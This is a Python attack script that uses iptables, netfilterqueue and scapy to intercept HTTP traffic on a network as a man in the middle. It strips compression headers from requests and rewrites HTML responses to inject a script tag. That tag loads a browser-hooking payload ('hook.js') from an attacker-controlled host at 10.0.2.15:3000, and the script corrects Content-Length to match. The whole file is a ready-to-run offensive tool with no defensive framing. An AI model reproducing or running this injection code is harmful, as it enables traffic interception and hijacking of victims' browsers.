#!/usr/bin/env python
import netfilterqueue
import os
import argparse
import re
import scapy.all as scapy

ack_list = []


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-ip", "--ip_command", dest="ip_command", help="IP table (forward or input,output)")
    choices = parser.parse_args()
    if not choices.ip_command:
        parser.error("\n[-] Please enter a IP table command, use --help for more info")
        exit()
    if choices.ip_command:
        return choices


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 10000:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")

        elif scapy_packet[scapy.TCP].sport == 10000:
            print("[+] Response")
            # print(scapy_packet.show())
            injection_code = ' <script src="http://10.0.2.15:3000/hook.js"></script>'
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


options = get_arguments()
try:
    if options.ip_command == "forward":
        os.popen("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    elif options.ip_command == "input":
        os.popen("iptables -I INPUT -j NFQUEUE --queue-num 0")
        os.popen("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt:
    os.popen("iptables --flush")
    print("[-] Detected ctrl+C.....resetting iptables")
